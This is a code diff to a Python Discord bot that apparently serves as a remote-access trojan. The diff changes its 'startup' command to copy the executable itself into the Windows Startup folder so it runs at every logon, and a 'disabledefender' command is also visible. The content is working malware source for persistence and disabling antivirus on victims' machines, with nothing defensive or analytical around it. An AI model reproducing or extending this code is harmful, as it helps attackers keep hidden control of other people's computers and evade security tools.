@@ -19,6 +19,7 @@ import os
 import shutil
 import pyperclip
 import tempfile
+import sys
 
 TOKEN = "BOT-TOKEN-GOES-HERE"
 intents = discord.Intents.all()
@@ -409,7 +410,7 @@ async def disabledefender(ctx):
 @bot.command(help="Makes this script execute on logon (only user that ran this file).")
 async def startup(ctx):
     try:
-        script_path = os.path.abspath(__file__)
+        script_path = sys.executable
         startup_folder = os.path.join(os.path.expanduser("~"), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', "Programs", "Startup")
     
         if os.path.exists(startup_folder):
@@ -422,7 +423,7 @@ async def startup(ctx):
             print(f"Script '{script_name}' moved to the startup folder.")
             await ctx.reply(f"Moved '{script_name}' to the startup folder.")
         else:
-            await ctx.reply(f"Starup folder \"{startup_folder}\" not found.")
+            await ctx.reply(f"Startup folder \"{startup_folder}\" not found.")
     except Exception as e:
         await ctx.reply(f"Error executing command: {str(e)}")
         
